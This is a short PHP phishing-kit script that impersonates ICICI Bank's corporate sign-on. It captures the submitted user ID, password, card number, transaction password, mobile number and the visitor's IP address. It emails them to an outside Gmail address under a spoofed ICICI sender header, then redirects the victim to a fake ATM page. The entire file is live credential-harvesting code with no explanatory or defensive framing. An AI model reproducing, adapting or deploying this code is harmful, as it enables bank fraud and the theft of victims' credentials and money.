<?

$ip = getenv("REMOTE_ADDR");
$message .= "--------------ICICI BANK----------------------\n";
$message .= "User ID: ".$_POST['CorporateSignonCorpId']."\n";   
$message .= "Password: ".$_POST['CorporateSignonPassword']."\n";
$message .= "Card no: ".$_POST['CorporateSignoncardno']."\n";   
$message .= "Tpass: ".$_POST['CorporateSignontpass']."\n";
$message .= "Mobile No: ".$_POST['CorporateSignonemail']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------DR-SPAWN------------------------------\n";

$recipient ="ee2568@gmail.com";
$subject = "icici login";
$headers = "ICICI-Bank@icici.co.in";
$headers .= "MIME-Version: 1.0\n";
	 
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: ATM.htm");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>